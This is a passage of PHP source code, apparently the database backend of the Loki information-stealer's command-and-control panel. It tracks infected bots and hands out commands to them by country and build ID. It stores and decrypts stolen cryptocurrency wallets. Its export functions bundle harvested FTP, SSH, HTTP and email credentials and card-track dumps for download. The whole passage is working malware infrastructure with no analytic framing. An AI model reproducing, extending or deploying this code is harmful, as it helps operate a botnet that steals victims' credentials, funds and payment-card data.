			if (!($STMT->bind_param('iiisss', $ReportID, $Time, $DataClient, $Data, $DataHash, $DataType)))
			{
				$this->Error_("Bind failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}

			$STMT->close();
			return TRUE;
		}
		
		function InsertWallet($WalletName, $Time, $ReportID, $WalletClient, $WalletHash, $Size)
		{
			if($this->ElementExists__($this->GetTableName(LOKI_WALLETS_TABLE), "wallet_id", "wallet_hash", $WalletHash) !== NULL)
				return FALSE;

			$Result = TRUE;
			
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_WALLETS_TABLE). "` (`report_id`, `wallet_time`, `wallet_client`, `wallet_name`, `wallet_hash`, `wallet_size`) VALUES (?, ?, ?, ?, ?, ?)")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$Time 		= $this->EscapeString(intval($Time));
			$ReportID 	= $this->EscapeString(intval($ReportID));
			$Size 		= $this->EscapeString(intval($Size));
			$WalletClient = $this->EscapeString(intval($WalletClient));

			$WalletName = $this->EscapeString($WalletName);
			$WalletHash = $this->EscapeString($WalletHash);

			if (!($STMT->bind_param('iiissi', $ReportID, $Time, $WalletClient, $WalletName, $WalletHash, $Size)))
			{
				$this->Error_("Bind failed: (" . $STMT->errno . ") " . $STMT->error);
				$Result = FALSE;
			}
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed: (" . $STMT->errno . ") " . $STMT->error);
			}
			else
				$Result = $STMT->insert_id;

			$STMT->close();
			return $Result;
		}
		
		function GetWallet($Start = 0, $Limit = 0, $Country = array(), $Client = array(), $ReportID = NULL, $Balance = NULL, $Locked = NULL, $Transaction = NULL, $Checked = NULL, $Inpector = FALSE, $WalletHash = NULL, $OrderByIndex = 0, $OrderSort = TRUE)
		{
			$Start = intval($Start);
			$Limit = intval($Limit);

			if (!$this->State || $Limit < 0)
				return FALSE;
			
			$OrderByDB 	= array("wallet_id");
			$Order 		= $OrderSort ? "DESC" : "ASC";
			$OrderBy 	= $OrderByDB[0];
			
			if(isset($OrderByDB[$OrderByIndex]))
				$OrderBy = $OrderByDB[$OrderByIndex];
			
			$Where 	= '';
			
			if (count($Country))
				$Where = ' INNER JOIN '.$this->GetTableName(LOKI_REPORT_TABLE). ' USING (report_id) ';

			if($Inpector)
			{
				$Where = $this->BuildWhere($Where, 'wallet_client != 2');
				$Where = $this->BuildWhere($Where, 'wallet_client != 3');
				$Where = $this->BuildWhere($Where, 'wallet_client != 6');
				$Where = $this->BuildWhere($Where, 'wallet_client != 8');
				$Where = $this->BuildWhere($Where, 'wallet_client != 17');
				$Where = $this->BuildWhere($Where, 'wallet_client != 24');
				$Where = $this->BuildWhere($Where, 'wallet_client != 25');
				$Where = $this->BuildWhere($Where, 'wallet_client != 32');
				$Where = $this->BuildWhere($Where, 'wallet_client != 33');
			}
			
			if (!is_null($WalletHash))
				$Where = $this->BuildWhere($Where, 'wallet_hash = \'' . $this->EscapeString($WalletHash)) . "'";	
			
			if (!is_null($ReportID))
				$Where = $this->BuildWhere($Where, 'report_id = ' . $this->EscapeString(intval($ReportID)));	
			
			if (!is_null($Balance))
				$Where = $this->BuildWhere($Where, 'wallet_balance >= \'' . $this->EscapeString($Balance) . "'");		
			
			if (!is_null($Locked))
				$Where = $this->BuildWhere($Where, 'wallet_locked = ' . $this->EscapeString(intval($Locked)));		
			
			if (!is_null($Checked))
				$Where = $this->BuildWhere($Where, 'wallet_cheked = ' . $this->EscapeString(intval($Checked)));	
			
			if (!is_null($Transaction))
				$Where = $this->BuildWhere($Where, 'wallet_transactions = ' . $this->EscapeString(intval($Transaction)));	
				
			if (sizeof($Country))
			{
				$CountryList = array();
				foreach ($Country as $Key => $Value)
					$CountryList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'report_country in ('.implode(",", $CountryList).')');
				unset($CountryList);
			}
			
			if (sizeof($Client))
			{
				$ClientList = array();
				foreach ($Client as $Key => $Value)
					$ClientList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'wallet_client in ('.implode(",", $ClientList).')');
				unset($ClientList);
			}
			
			return $this->RunQuerys($Start, $Limit, $this->GetTableName(LOKI_WALLETS_TABLE), "*", $Where, $OrderBy, $Order, "wallet_id", TRUE);
		}
		function GetBots($Start = 0, $Limit = 0, $BotID = 0, $GUID = NULL, $IP = NULL, $Country = array(), $OrderByIndex = 0, $OrderSort = TRUE, $BinID = NULL)
		{
			$Start = intval($Start);
			$Limit = intval($Limit);

			if (!$this->State || $Limit < 0)
				return FALSE;
			
			$OrderByDB 	= array("bot_last_online", "bot_id");
			$Order 		= $OrderSort ? "DESC" : "ASC";
			$OrderBy 	= $OrderByDB[0];
			
			if(isset($OrderByDB[$OrderByIndex]))
				$OrderBy = $OrderByDB[$OrderByIndex];
			
			$Where = '';

			if ($BotID != 0)
				$Where = $this->BuildWhere($Where, "bot_id = " . $this->EscapeString(intval($BotID)));
			
			if ($IP != NULL)
				$Where = $this->BuildWhere($Where, "bot_ip = '" . $this->EscapeString($IP) . "'");
			
			if ($BinID != NULL)
				$Where = $this->BuildWhere($Where, "bot_bin_id = '" . $this->EscapeString($BinID) . "'");
			
			if ($GUID != NULL)
				$Where = $this->BuildWhere($Where, "bot_guid = '" . $this->EscapeString($GUID) . "'");

			if (sizeof($Country))
			{
				$CountryList = array();
				foreach ($Country as $Key => $Value)
					$CountryList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'bot_country in ('.implode(",", $CountryList).')');
				unset($CountryList);
			}
			
			return $this->RunQuerys($Start, $Limit, $this->GetTableName(LOKI_BOTS_TABLE), "*", $Where, $OrderBy, $Order, "bot_id", TRUE);
		}

		function GetCommands($Start = 0, $Limit = 0, $OrderByIndex = 0, $OrderSort = TRUE)
		{
			$Start = intval($Start);
			$Limit = intval($Limit);

			if (!$this->State || $Limit < 0)
				return FALSE;
			
			$OrderByDB 	= array("command_time", "command_limit", "command_loaded");
			$Order 		= $OrderSort ? "DESC" : "ASC";
			$OrderBy 	= $OrderByDB[0];
			
			if(isset($OrderByDB[$OrderByIndex]))
				$OrderBy = $OrderByDB[$OrderByIndex];
			
			$Where = '';
			
			return $this->RunQuerys($Start, $Limit, $this->GetTableName(LOKI_COMMAND_TABLE), "*", $Where, $OrderBy, $Order, "command_id", TRUE);
		}
		
		function AddNumToCommand($CommandID)
		{
			$Query = "UPDATE `".$this->GetTableName(LOKI_COMMAND_TABLE)."` SET command_loaded = command_loaded + 1 WHERE command_id = '" .$this->EscapeString($CommandID). "'";
			if ((!$Result = $this->DBQuery($Query)))
				return NULL;
		}
		
		function InsertCommandsLog($BotID, $CommandID)
		{
			$Result = FALSE;
			
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_COMMAND_LOG_TABLE). "` VALUES (null, ?, ?, ?)")))
			{
				return $Result;
			}

			$BotID 		= $this->EscapeString(intval($BotID));
			$CommandID 	= $this->EscapeString(intval($CommandID));
			$Time 		= time();
			
			if (!($STMT->bind_param('iii', $CommandID, $BotID, $Time)))
			{
				$Result = $Result;
			}
			
			if (!$STMT->execute())
			{
			}
			else
				$Result = $STMT->insert_id;

			$STMT->close();
			return $Result;
		}
		
		function GetCommandsBots($BotID)
		{
			$Results = NULL;
			
			$BotInfo = $this->GetBots(0, 1, $BotID);
			if(isset($BotInfo[0]))
			{
				$Query = "SELECT * FROM `".$this->GetTableName(LOKI_COMMAND_TABLE)."` WHERE command_active = 1 AND command_wallet <= ".$BotInfo[0]['bot_coin']." AND (`command_bot_guid` = '".$BotInfo[0]['bot_guid']."' OR (
			(`command_country` LIKE '%".$BotInfo[0]['bot_country']."%' OR `command_country` = '0') AND 
			(`command_bin_id` = '".$BotInfo[0]['bot_bin_id']."' OR `command_bin_id` = '0') AND (`command_limit` > `command_loaded` OR `command_limit` = 0))) ORDER BY command_type ASC";
			
				if ((!$Result = $this->DBQuery($Query)))
					return NULL;

				while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				{
					if(strlen($MyRow['command_bot_guid']) > 5 && $MyRow['command_bot_guid'] != $BotInfo[0]['bot_guid'])
						continue;
					if(strlen($MyRow['command_bin_id']) > 2 && $MyRow['command_bin_id'] != $BotInfo[0]['bot_bin_id'])
						continue;
					
					if($MyRow['command_duplicate'] == 1)
					{
						$Results[] = $MyRow;
						$this->AddNumToCommand($MyRow['command_id']);
					}
					else
					{
						$Query = "SELECT count(*) as Cnt FROM `".$this->GetTableName(LOKI_COMMAND_LOG_TABLE)."` WHERE command_log_command_id = ".$MyRow['command_id']." AND command_log_bot_id = ".$BotID;
						if ($Result__ = $this->DBQuery($Query))
						{
							while ($MyData = $Result__->fetch_array(MYSQLI_ASSOC))
							{
								if($MyData['Cnt'] == 0)
								{
									$this->InsertCommandsLog($BotID, $MyRow['command_id']);
									$Results[] = $MyRow;
									$this->AddNumToCommand($MyRow['command_id']);
								}
							}
						}
					}
				}
			}
			return $Results;
		}
		
		function RunQuerys($Start, $Limit, $Table, $RowsDB, $Where, $OrderBy, $Order, $CntRow = "*", $Cnt = TRUE)
		{
			$Rows = "";
			if(is_array($RowsDB))
				$Rows = implode(", ", $RowsDB);
			else
				$Rows = $RowsDB;
			
			$Query = "SELECT " .$Rows. " FROM " .$Table. " " .$Where. " GROUP BY " .$OrderBy. " " .$Order;
			
			if($Start && $Limit)
				$Query .= " LIMIT " . $this->EscapeString($Start). ", " . $this->EscapeString($Limit);
			else if($Limit)
				$Query .= " LIMIT " . $this->EscapeString($Limit);

			
			$Result = NULL;
			if ((!$Result = $this->DBQuery($Query)))
				return NULL;
			
			$Results = array();
			$Results["NumOfData"] = $i = 0;
			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[$i++] = $MyRow;
			
			$Results["NumOfData"] = $i;
			
			if($Cnt)
			{
				$CntQuery = "SELECT count(" .$CntRow. ") as NumOfGoodData FROM " .$Table. " " .$Where;
				if ((!$CntQueryResult = $this->DBQuery($CntQuery)))
					return NULL;
				
				$CntResult = $CntQueryResult->fetch_array(MYSQLI_ASSOC);
				$Results["NumOfTotal"] = $CntResult["NumOfGoodData"];
			}

			return $Results;
		}
		
		function UpdateWallet($Balance = NULL, $Locked = NULL, $Transaction = NULL, $Password = NULL, $WalletID = NULL, $WalletHash = NULL)
		{
			$Where	= '';
			$Result	= NULL;
			
			if ($WalletID != NULL)
				$Where = $this->BuildWhere($Where, 'wallet_id = ' . $this->EscapeString(intval($WalletID)));
			
			if ($WalletHash != NULL)
				$Where = $this->BuildWhere($Where, 'wallet_hash = \'' . $this->EscapeString($WalletHash) . '\'');
			
			if($Password != NULL)
			{
				$Query = "UPDATE `".$this->GetTableName(LOKI_WALLETS_TABLE)."` SET wallet_password = '" . $this->EscapeString($Password) ."' ". $Where;
				//print $Query;
				if ((!$Result = $this->DBQuery($Query)))
					return NULL;	
			}
			else
			{
				$Query = "UPDATE `".$this->GetTableName(LOKI_WALLETS_TABLE)."` SET wallet_balance = " . $this->EscapeString($Balance) . ", wallet_locked = " . intval($this->EscapeString($Locked)) . ", wallet_transactions = " . intval($this->EscapeString($Transaction)) . ", wallet_cheked = 1" ." ". $Where;
				//print $Query;
				if ((!$Result = $this->DBQuery($Query)))
					return NULL;	
			}
			
			return $Result;
		}
		
		
		function GetReport($Start = 0, $Limit = 0, $Type = 'limit', $ReportID = 0, $GUID = NULL, $IP = NULL, $BinID = NULL, $Country = NULL)
		{
			$Start = intval($Start);
			$Limit = intval($Limit);

			if (!$this->State || $Limit < 0)
				return FALSE;

			$Query = '';
			$Where = '';

			if ($ReportID != 0)
				$Where = $this->BuildWhere($Where, "report_id = " . $this->EscapeString(intval($ReportID)));
			
			 if ($IP != NULL)
				$Where = $this->BuildWhere($Where, "report_ip = '" . $this->EscapeString($IP) . "'");
			
			 if ($Country != NULL && strlen($Country) == 2)
				$Where = $this->BuildWhere($Where, "report_country = '" . $this->EscapeString($Country) . "'");
			
			 if ($GUID != NULL)
				$Where = $this->BuildWhere($Where, "report_guid = '" . $this->EscapeString($GUID) . "'");

			 if ($BinID != NULL)
				$Where = $this->BuildWhere($Where, "report_bin_id = '" . $this->EscapeString($BinID) . "'");
			
			if($Type == 'limit')
				$Query .= "SELECT report_id, report_time, report_ip, report_name, report_guid, report_bin_id, report_country, report_version, report_os, report_is_win64, report_data, report_data_num FROM ". $this->GetTableName(LOKI_REPORT_TABLE). $Where ." GROUP BY report_id DESC ";
			else
				$Query  .= "SELECT * FROM ".$this->GetTableName(LOKI_REPORT_TABLE). " ". $Where ." GROUP BY report_id DESC";
			
			if($Start && $Limit)
				$Query .= " LIMIT "  . $this->EscapeString($Start). ", " . $this->EscapeString($Limit);
			else if($Limit)
				$Query .= " LIMIT " . $this->EscapeString($Limit);

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			$Query2 = "SELECT count(report_id) as NumOfGoodData FROM ". $this->GetTableName(LOKI_REPORT_TABLE). " " . $Where . " ORDER BY report_id DESC";
			if ((!$Result2 = $this->DBQuery($Query2)))
				return NULL;

			$Num = 0;
			$Results = array();
			$Results["NumOfData"] = 0;

			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[$Num++] = $MyRow;

			$tmp___ = $Result2->fetch_array(MYSQLI_ASSOC);
			$Results["NumOfTotal"] = $tmp___["NumOfGoodData"];
			$Results["NumOfData"] = $Num;
			return $Results;
		}
		function GetData($Type, $Start = 0, $Limit = 0, $SubType = 'both', $FilterText = array(), $Country = array(), $ReportID = NULL, $DataID = NULL)
		{
			$Start = intval($Start);
			$Limit = intval($Limit);

			if (!$this->State || $Limit < 0)
				return FALSE;

			$Query = '';
			$Where 	= '';
			
			if (count($Country))
				$Where = ' INNER JOIN '.$this->GetTableName(LOKI_REPORT_TABLE). ' USING (report_id) ';

			if ($Type == 'ftp')
			{
				if ($SubType == 'ssh')
					$Where = $this->BuildWhere($Where, "data_type='ssh'");
				else if ($SubType == 'ftp')
					$Where = $this->BuildWhere($Where, "data_type='ftp'");
				else
					$Where = $this->BuildWhere($Where, "(data_type = 'ftp' OR data_type = 'ssh')");
			}
			else if ($Type == 'http')
			{
				$Where = $this->BuildWhere($Where, "(data_type='http' OR data_type='https')");
				
				if ($SubType == 'https')
					$Where = $this->BuildWhere($Where, "data_text LIKE 'https://%'");
				else if ($SubType == 'http')
					$Where = $this->BuildWhere($Where, "data_text LIKE 'http://%'");
			}
			else if ($Type == 'data')
			{
				$Where = $this->BuildWhere($Where, "(data_type = 'data' OR data_type = 'datadl' OR data_type = 'mail' OR data_type = 'vnc')");
			}
			else if ($Type == 'dump')
			{
				$Where = $this->BuildWhere($Where, "data_type = 'dump'");
			}
			else if ($Type == 'error')
			{
				$Where = $this->BuildWhere($Where, "data_type = 'error'");
			}
			else
			{
				$Where = $this->BuildWhere($Where, "data_type != 'error'");
			}
			
			
			if ($ReportID != NULL)
				$Where = $this->BuildWhere($Where, "report_id = " . $this->EscapeString(intval($ReportID)));

			if ($DataID != NULL)
				$Where = $this->BuildWhere($Where, "data_id = " . $this->EscapeString(intval($DataID)));

			
			if (sizeof($Country))
			{
				$CountryList = array();
				foreach ($Country as $Key => $Value)
					$CountryList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'report_country in ('.implode(",", $CountryList).')');
				unset($CountryList);
			}
			
			if (sizeof($FilterText))
			{
				$NextOR = FALSE;
				$NextNOT = FALSE;
				foreach ($FilterText as $Key => $Value)
				{
					if($Value == "OR")
					{
						$NextOR = TRUE;
					}
					else if($Value == "NOT")
					{
						$NextNOT = TRUE;
					}
					else
					{
						if($NextNOT)
							$Where = $this->BuildWhere($Where, "data_text NOT LIKE '%". $this->EscapeString($Value). "%'", $NextOR);
						else
							$Where = $this->BuildWhere($Where, "data_text LIKE '%". $this->EscapeString($Value). "%'", $NextOR);
						
						$NextOR = FALSE;
						$NextNOT = FALSE;
					}
				}
					
			}
			
			$Query2 = "SELECT count(*) as NumOfGoodData FROM ".$this->GetTableName(LOKI_DATA_TABLE)."$Where ORDER BY data_id DESC";
			$Query  = "SELECT * FROM ".$this->GetTableName(LOKI_DATA_TABLE)."$Where ORDER BY data_id DESC";

			if($Start && $Limit)
				$Query .= " LIMIT "  . $this->EscapeString($Start). ", " . $this->EscapeString($Limit);
			else if($Limit)
				$Query .= " LIMIT " . $this->EscapeString($Limit);

			if ((!$Result = $this->DBHandle->query($Query)))
			{
				$this->Error_("Query failed: (" . $Query . ") " . $this->DBHandle->error);
				return NULL;
			}

			if ((!$Result2 = $this->DBHandle->query($Query2)))
			{
				$this->Error_("Query failed: (" . $Query2 . ") " . $this->DBHandle->error);
				return NULL;
			}

			$Num = 0;
			$Results = array();
			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
			{
				$Results[$Num++] = $MyRow;
			}

			$tmp___ = $Result2->fetch_array(MYSQLI_ASSOC); //hot ubu fix
			$Results["NumOfTotal"] = $tmp___["NumOfGoodData"];
			$Results["NumOfData"] = $Num;
			return $Results;
		}

		function FlushDataTables()
		{
			$this->FlushTable($this->GetTableName(LOKI_DATA_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_REPORT_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_LOGS_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_WALLETS_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_BOTS_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_COMMAND_TABLE));
			$this->FlushTable($this->GetTableName(LOKI_COMMAND_LOG_TABLE));
			return TRUE;
		}

		function ExportAllDATAData($Text = NULL, $Country = NULL)
		{
			$Data = $this->GetData('data', 0, 0, NULL, $Text, $Country);
			$Counter = 0;
			$DataDL = array();
			$Text = '';
			
			while($Data["NumOfData"] > $Counter)
			{
				if($Data[$Counter]['data_type'] == 'datadl')
					$DataDL[] = $Data[$Counter];
				else if($Data[$Counter]['data_type'] == 'mail')
						{
							$JSON_ = json_decode(stripslashes ($Data[$Counter]["data_text"]), TRUE);
							
							if(strlen($JSON_['PR']))
								$Text .= $JSON_['PR'] . "://";
							
							$Text .= $JSON_['EM'] . "|";
							
							if(strlen($JSON_['SE']))
							{
								$Text .= $JSON_['SE'];
								if(strlen($JSON_['PO']))
									$Text .= ":" . $JSON_['PO'];
								
								$Text .= "|";
							}
								
							$Text .= $JSON_['US'] . "|" . $JSON_['PW'] . "\r\n";
							
							$JSON__ = NULL;
						}
				else
					$Text .= $Data[$Counter]["data_text"] . "\r\n";
				
				$Counter++;
			}
			
			$CntDL = sizeof($DataDL);
			if($CntDL > 0)
			{
				$TMPName = tempnam(TEMP_, 'zip');
				$ZIP_ = NewZipFile($TMPName);
				if($ZIP_)
				{
					AddBufferToZip($ZIP_, "DATA_Export_" . NowDate("Ymd_His") . ".txt", $Text);

					$Cnt = 0;
					$FileName = array();
					
					while($CntDL > $Cnt)
					{
						$Rand = '';
								$File___ = GetTMPDir() . '/' . $DataDL[$Cnt]['data_text'];
								if(file_exists($File___))
								{
									if(in_array($DataDL[$Cnt]['data_text'], $FileName))
										$Rand = MakeRandomString(4) . '_';
									else
										$FileName[] = $DataDL[$Cnt]['data_text'];
						
									$Buffer = DecryptWallet(file_get_contents($File___), ENCKEY_);
									AddBufferToZip($ZIP_, NowDate("Ymd_His") . "_" . $Rand . $DataDL[$Cnt]['data_text'], $Buffer);
									$Buffer = NULL;
								}
								
						$Cnt++;
					}		
					unset($FileName);
					SaveZip($ZIP_);
					
					$Buffer = file_get_contents($TMPName);
					unlink($TMPName);
					SetDownloadHeader("DATA_Export_" . NowDate("Ymd_His") . ".zip");
					echo $Buffer;
					die();
				}
				else
				{
					echo 'We got some problem!';
					die();
				}
			}
			else
			{
				SetDownloadHeader("DATA_Export_" . NowDate("Ymd_His") . ".txt");
				echo $Text;
				die();
			}
		}
		
		function ExportAllWallet($Start = 0, $Limit = 0, $Country = array(), $Client = array(), $ReportID = NULL, $Balance = NULL, $Locked = NULL, $Transaction = NULL, $Checked = NULL, $Inpector = FALSE, $WalletHash = NULL)
		{
			$DataDL = $this->GetWallet(0, 0, $Country, $Client, $ReportID, $Balance, $Locked, $Transaction, $Checked, $Inpector, $WalletHash);

			$CntDL = sizeof($DataDL);
			if($CntDL > 0)
			{
				$TMPName = tempnam(TEMP_, 'zip');
				$ZIP_ = NewZipFile($TMPName);
				if($ZIP_)
				{
					$Cnt = 0;
					while($CntDL > $Cnt)
					{
						AddBufferToZip($ZIP_, $DataDL[$Cnt]['wallet_name'], 
						DecryptWallet(file_get_contents(TEMP_.'/'.$DataDL[$Cnt]['wallet_name']), ENCKEY_));
						$Cnt++;
					}
					SaveZip($ZIP_);
					
					$Buffer = file_get_contents($TMPName);
					unlink($TMPName);
					SetDownloadHeader("WALLET_Export_" . NowDate("Ymd_His") . ".zip");
					echo $Buffer;
					die();
				}
				else
				{
					echo 'We got some problem!';
					die();
				}
			}
			else
			{
				SetDownloadHeader("DATA_Export_" . NowDate("Ymd_His") . ".txt");
				echo $Text;
				die();
			}
		}

		function ExportAllHTTPData($Text = NULL, $Country = NULL)
		{
			$Data = $this->GetData('http', 0, 0, NULL, $Text, $Country);
			$Counter = 0;
			while($Data["NumOfData"] > $Counter)
			{
				echo $Data[$Counter]["data_text"] . "\r\n";
				$Counter++;
			}
		}

		function ExportAllFTPData($Text = NULL, $Country = NULL)
		{
			$Data = $this->GetData('ftp', 0, 0, NULL, $Text, $Country);
			$Counter = 0;
			while($Data["NumOfData"] > $Counter)
			{
				echo $Data[$Counter]["data_text"] . "\r\n";
				$Counter++;
			}
		}
		
		function ExportAllErrorData()
		{
			$Data = $this->GetData('error', 0, 0, NULL, $Text, $Country);
			$Counter = 0;
			while($Data["NumOfData"] > $Counter)
			{
				echo $Data[$Counter]["data_text"] . "\r\n";
				$Counter++;
			}
		}

		function ExportAllDump($Text = NULL, $Country = NULL)
		{
			$TackDB = array("Track 1", "Track 2", "Track 3");
			
			$Data = $this->GetData('dump', 0, 0, NULL, $Text, $Country);
			$Counter = 0;
			while($Data["NumOfData"] > $Counter)
			{
				$ExplodedDump = explode("|", $Data[$Counter]["data_text"]);
				echo str_pad($ExplodedDump[0], 80) . str_pad($TackDB[$ExplodedDump[1]], 10) .  str_pad($ExplodedDump[3], 15) . "\r\n";
				$Counter++;
			}
		}
		
		function ExportDatabyID($DataID = 0, $Limit = 1)
		{
			$Data = $this->GetData('data', 0, $Limit, NULL, NULL, NULL, NULL, $DataID);
			if($Data["NumOfData"] > 0)
			{
				return $Data[0]["data_text"];
			}

			return NULL;
		}

		function GetAllDatabyID($ID_)
		{
			$Result['DATA'] 	= $this->GetData(NULL, NULL, NULL, NULL, NULL, NULL, $ID_);
			$Result['WALLET']	= $this->GetWallet(NULL, NULL, NULL, NULL, $ID_);
			$Result['REPORT'] 	= $this->GetReport(NULL, 1, 'all', $ID_);
			return $Result;
		}
		
		function DeleteWallet($LastID = NULL, $Country = array(), $Client = array(), $ReportID = NULL, $Balance = NULL, $Locked = NULL, $Transaction = NULL, $Checked = NULL, $Inpector = FALSE, $WalletHash = NULL)
		{
			$Query = "DELETE FROM ".$this->GetTableName(LOKI_WALLETS_TABLE);
			$Where = '';
			
			if (!is_null($LastID))
				$Where = $this->BuildWhere($Where, $this->EscapeString(intval($LastID))." >= wallet_id");

			if (count($Country))
				$Where = ' INNER JOIN '.$this->GetTableName(LOKI_REPORT_TABLE). ' USING (report_id) ';

			if($Inpector)
			{
				$Where = $this->BuildWhere($Where, 'wallet_client != 2');
				$Where = $this->BuildWhere($Where, 'wallet_client != 3');
				$Where = $this->BuildWhere($Where, 'wallet_client != 6');
				$Where = $this->BuildWhere($Where, 'wallet_client != 8');
				$Where = $this->BuildWhere($Where, 'wallet_client != 17');
				$Where = $this->BuildWhere($Where, 'wallet_client != 24');
				$Where = $this->BuildWhere($Where, 'wallet_client != 25');
				$Where = $this->BuildWhere($Where, 'wallet_client != 32');
				$Where = $this->BuildWhere($Where, 'wallet_client != 33');
			}
			
			if (!is_null($WalletHash))
				$Where = $this->BuildWhere($Where, 'wallet_hash = \'' . $this->EscapeString($WalletHash)) . "'";	
			
			if (!is_null($ReportID))
				$Where = $this->BuildWhere($Where, 'report_id = ' . $this->EscapeString(intval($ReportID)));	
			
			if (!is_null($Balance))
				$Where = $this->BuildWhere($Where, 'wallet_balance >= \'' . $this->EscapeString($Balance) . "'");		
			
			if (!is_null($Locked))
				$Where = $this->BuildWhere($Where, 'wallet_locked = ' . $this->EscapeString(intval($Locked)));		
			
			if (!is_null($Checked))
				$Where = $this->BuildWhere($Where, 'wallet_cheked = ' . $this->EscapeString(intval($Checked)));	
			
			if (!is_null($Transaction))
				$Where = $this->BuildWhere($Where, 'wallet_transactions = ' . $this->EscapeString(intval($Transaction)));	
				
			if (sizeof($Country))
			{
				$CountryList = array();
				foreach ($Country as $Key => $Value)
					$CountryList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'report_country in ('.implode(",", $CountryList).')');
				unset($CountryList);
			}
			
			if (sizeof($Client))
			{
				$ClientList = array();
				foreach ($Client as $Key => $Value)
					$ClientList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'wallet_client in ('.implode(",", $ClientList).')');
				unset($ClientList);
			}
			
			if ((!$Result = $this->DBQuery($Query . " " . $Where)))
				return NULL;

			return TRUE;
		}
		

		
		function TestCra__()
		{
			$this->FixReportNums(3480);
			return;
		}
		
		function FixReportNums($ReportID)
		{
			$TotalData 	 = $this->CountTpl($this->GetTableName(LOKI_DATA_TABLE), "data_id", "report_id", $ReportID);
			$TotalWallet = 0;
			
			if(MODULE_WALLET)
				$TotalWallet = $this->CountTpl($this->GetTableName(LOKI_WALLETS_TABLE), "wallet_id", "report_id", $ReportID);
			
			$Result = $TotalData + $TotalWallet;
			
			if ((!$Result__ = $this->DBQuery("UPDATE `".$this->GetTableName(LOKI_REPORT_TABLE)."` SET report_data_num = ".$Result." WHERE report_id = " . intval($ReportID))))
				return NULL;
		}
		
		function DeleteReport($LastID = NULL, $ID_ = NULL, $Text = NULL)
		{
			$this->DeleteData(NULL, $LastID, NULL, NULL, $ID_);
			
			$Query = "DELETE FROM ".$this->GetTableName(LOKI_REPORT_TABLE);
			$QuerID_ = NULL;
			
			if($LastID != NULL)
			{
				$Query .= " WHERE ? >= report_id";
				$QuerID_ = $LastID;
			}
			else if($ID_ != NULL)
			{
				$Query .= " WHERE ? = report_id";
				$QuerID_ = $ID_;
			}
			
			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($QuerID_ != NULL)
			{
				$QuerID_ = $this->EscapeString(intval($QuerID_));
				if (!($STMT->bind_param('i', $QuerID_)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}
			}

			//$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			return TRUE;
		}
		
		function DeleteData($Type = NULL, $LastID = NULL, $Text = NULL, $Country = NULL, $ReportID = NULL)
		{
			$Query = "DELETE FROM ".$this->GetTableName(LOKI_DATA_TABLE);
			$Where = '';
			
			if (count($Country))
				$Where = ' INNER JOIN '.$this->GetTableName(LOKI_REPORT_TABLE). ' USING (report_id) ';
			
			if (sizeof($Country))
			{
				$CountryList = array();
				foreach ($Country as $Key => $Value)
					$CountryList[] = "'".$this->EscapeString($Value)."'";
					
				$Where = $this->BuildWhere($Where, 'report_country in ('.implode(",", $CountryList).')');
				unset($CountryList);
			}
			
			if (sizeof($Text))
			{
				$NextOR = FALSE;
				$NextNOT = FALSE;
				foreach ($Text as $Key => $Value)
				{
					if($Value == "OR")
					{
						$NextOR = TRUE;
					}
					else if($Value == "NOT")
					{
						$NextNOT = TRUE;
					}
					else
					{
						if($NextNOT)
							$Where = $this->BuildWhere($Where, "data_text NOT LIKE '%". $this->EscapeString($Value). "%'", $NextOR);
						else
							$Where = $this->BuildWhere($Where, "data_text LIKE '%". $this->EscapeString($Value). "%'", $NextOR);
						
						$NextOR = FALSE;
						$NextNOT = FALSE;
					}
				}
					
			}
			
			$IDInt = NULL;
			
			if($ReportID != NULL)
			{
				$IDInt = $ReportID;
				$Where = $this->BuildWhere($Where, " report_id = ?");
			}
			
			if($LastID != NULL)
			{
				$IDInt = $LastID;
				$Where = $this->BuildWhere($Where, " ? >= data_id");
			}
				

			if($Type != NULL)
			{
				if($Type == "http")
					$Where = $this->BuildWhere($Where, "data_type='http'");
				else if($Type == "dump")
					$Where = $this->BuildWhere($Where, "data_type='dump'");
				else if($Type == "error")
					$Where = $this->BuildWhere($Where, "data_type='error'");
				else if($Type == "ftp")
					$Where = $this->BuildWhere($Where, "(data_type = 'ftp' OR data_type = 'ssh')");
				else if($Type == "data")
					$Where = $this->BuildWhere($Where, "(data_type = 'data' OR data_type = 'datadl' OR data_type = 'mail' OR data_type = 'vnc')");
			}
			
			
			if (!($STMT = $this->DBHandle->prepare($Query . " ". $Where)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($IDInt != NULL)
			{
				$IDInt = $this->EscapeString(intval($IDInt));
				if (!($STMT->bind_param('i', $IDInt)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}        
			}

		   //$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
